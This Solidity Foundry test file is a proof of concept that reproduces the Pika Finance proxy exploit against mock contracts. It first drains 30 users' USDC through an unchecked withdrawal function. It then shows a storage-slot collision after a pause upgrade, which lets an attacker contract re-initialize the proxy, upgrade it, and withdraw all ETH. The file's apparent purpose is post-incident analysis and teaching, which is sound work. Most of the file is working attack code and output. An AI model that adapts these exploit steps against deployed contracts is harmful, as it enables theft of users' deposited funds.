// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test, console2, StdStorage} from "forge-std/Test.sol";
import {stdStorageSafe, FindData} from "forge-std/StdStorage.sol";
import {PikaFinanceProxy} from "../src/PikaFinanceProxy.sol";
import {OriginalImplementation} from "../src/OriginalImplementation.sol";
import {NewExploitedImplementation} from "../src/NewExploitedImplementation.sol";
import {ERC20Mock} from "openzeppelin-contracts/contracts/mocks/token/ERC20Mock.sol";
import {Strings} from "openzeppelin-contracts/contracts/utils/Strings.sol";
import {AttackerImplementation, IPikaFinanceProxy} from "../src/AttackerImplementation.sol";

contract PikaExploitPoC is Test {
    using stdStorageSafe for StdStorage;

    ERC20Mock public usdcMock;
    address public attackerEOA;
    address public pikaFinanceEOA;
    OriginalImplementation public originalImplementation;
    PikaFinanceProxy public pikaFinanceProxy;

    function setUp() public {
        // ** create addresses
        attackerEOA = makeAddr("attackerEOA");
        pikaFinanceEOA = makeAddr("PikaFinanceEOA");
        address usdcDeployer = makeAddr("usdcDeployer");
        vm.deal(attackerEOA, 10000 ether);
        vm.deal(pikaFinanceEOA, 10000 ether);
        vm.deal(usdcDeployer, 10000 ether);

        // ** deploy usdcMock
        vm.startPrank(usdcDeployer);
        usdcMock = new ERC20Mock();
        vm.stopPrank();

        // ** fund USDC to users for testing
        uint256 fundAmount = 10000 ether;
        for (uint256 i; i < 30; i++) {
            usdcMock.mint(
                makeAddr(string.concat("user", Strings.toString(i))),
                fundAmount
            );
        }

        // ** 1. deploy OriginalImplementation
        // ** 2. deploy PikaFinanceProxy
        // ** 3. initialize PikaFinanceProxy
        // ** 4. upgrade PikaFinanceProxy to OriginalImplementation
        vm.startPrank(pikaFinanceEOA);
        originalImplementation = new OriginalImplementation();
        originalImplementation.initialize(address(usdcMock));
        pikaFinanceProxy = new PikaFinanceProxy();
        pikaFinanceProxy.upgradeToAndCall(
            address(originalImplementation),
            abi.encodeWithSignature("initialize(address)", address(usdcMock))
        );
        vm.stopPrank();
    }

    function testAttack() public {
        // ** Users deposit USDC and ETH to Pika Finance
        address user;
        for (uint256 i; i < 30; i++) {
            user = makeAddr(string.concat("user", Strings.toString(i)));
            vm.deal(user, 10000 ether);
            vm.startPrank(user);
            usdcMock.approve(address(pikaFinanceProxy), 1000 ether);
            OriginalImplementation(address(pikaFinanceProxy)).depositUSDC(
                1000 ether
            );
            OriginalImplementation(address(pikaFinanceProxy)).depositETH{
                value: 1000 ether
            }();
            vm.stopPrank();
        }

        // ** First exploit: attacker calls withdrawUSDC to drain users' USDC from Pika Finance
        vm.startPrank(attackerEOA);
        uint256 attackerUSDCBalanceBefore = usdcMock.balanceOf(attackerEOA);
        for (uint256 i; i < 30; i++) {
            user = makeAddr(string.concat("user", Strings.toString(i)));
            OriginalImplementation(address(pikaFinanceProxy)).withdrawUSDC(
                1000 ether,
                user
            );
        }
        uint256 attackerUSDCBalanceAfter = usdcMock.balanceOf(attackerEOA);
        vm.stopPrank();
        assertEq(
            attackerUSDCBalanceAfter - attackerUSDCBalanceBefore,
            30000 ether
        );

        //////////////////////////////////////////////////////////////*/
        // **                       POC START
        // ** reference : https://etherscan.io/tx/0xe2912b8bf34d561983f2ae95f34e33ecc7792a2905a3e317fcc98052bce66431
        //////////////////////////////////////////////////////////////*/
        console2.log(
            "-------------------- POC of Pika Finance Exploit --------------------"
        );
        console2.log();

        // ** After Pika Finance discovering the vulnerability, they needed to pause the contract, so they upgraded to an implementation contract that added the pause feature.
        // ** 1. deploy NewExploitedImplementation
        // ** 2. upgrade PikaFinanceProxy to NewExploitedImplementation
        // ** 3. pause the contract

        console2.log(
            "----Before Pika Finance upgrade to NewExploitedImplementation"
        );
        FindData memory data = stdstore
            .target(address(originalImplementation))
            .sig("initialized()")
            .find();
        (, uint256 offset) = stdstore
            .target(address(originalImplementation))
            .sig("initialized()")
            .findOffset(bytes32(data.slot), false);
        console2.log("slot info of initialized(offset in bits):");
        console2.log("slot:", data.slot, ", offset:", offset);
        console2.log("--");
        console2.log();

        vm.startPrank(pikaFinanceEOA);
        NewExploitedImplementation newExploitedImplementation = new NewExploitedImplementation();
        pikaFinanceProxy.upgradeTo(address(newExploitedImplementation));
        NewExploitedImplementation(address(pikaFinanceProxy)).pause();
        vm.stopPrank();
        assertEq(
            NewExploitedImplementation(address(pikaFinanceProxy)).paused(),
            true
        );

        console2.log(
            "----After Pika Finance upgrade to NewExploitedImplementation"
        );
        data = stdstore
            .target(address(newExploitedImplementation))
            .sig("initialized()")
            .find(true);
        (, offset) = stdstore
            .target(address(newExploitedImplementation))
            .sig("initialized()")
            .findOffset(bytes32(data.slot), false);
        console2.log("slot info of initialized(offset in bits):");
        console2.log("slot:", data.slot, ", offset:", offset);
        console2.log("--");
        console2.log();

        // ** check whether the contract is paused
        vm.startPrank(user);
        vm.expectRevert("contract is paused");
        NewExploitedImplementation(address(pikaFinanceProxy)).depositUSDC(
            1000 ether
        );
        vm.expectRevert("contract is paused");
        NewExploitedImplementation(address(pikaFinanceProxy)).depositETH{
            value: 1000 ether
        }();
        vm.expectRevert("contract is paused");
        NewExploitedImplementation(address(pikaFinanceProxy)).withdrawUSDC(
            1000 ether,
            user
        );
        vm.expectRevert("contract is paused");
        NewExploitedImplementation(address(pikaFinanceProxy)).withdrawETH(
            1000 ether
        );
        vm.stopPrank();

        // ** The exploit
        // ** 1. deploy AttackerImplementation
        // ** 2. call attack function that calls initialize and upgradeToAndCall with withdrawETHAll function
        console2.log("----Attack");
        uint256 attackerBalanceBefore = attackerEOA.balance;
        vm.startPrank(attackerEOA, attackerEOA);
        AttackerImplementation attackerImplementation = new AttackerImplementation();
        attackerImplementation.attack(
            IPikaFinanceProxy(address(pikaFinanceProxy))
        );
        vm.stopPrank();
        uint256 attackerBalanceAfter = attackerEOA.balance;
        console2.log(
            "attacker ETH balance before attack:",
            attackerBalanceBefore,
            "after attack:",
            attackerBalanceAfter
        );
    }
}
